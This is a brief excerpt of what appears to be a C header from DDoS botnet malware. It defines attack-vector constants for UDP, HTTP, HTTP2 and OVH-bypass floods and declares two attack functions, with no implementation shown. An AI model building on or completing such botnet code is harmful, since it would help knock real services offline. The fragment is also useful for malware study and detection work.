...
#define ATK_VEC_NUDP       5
#define ATK_VEC_HTTP       6
#define ATK_VEC_HTTP2      7
#define ATK_VEC_OVH        8
#define ATK_VEC_OVHV2      9
...
void attack_method_ovhv2(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
...
void attack_app_http2(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
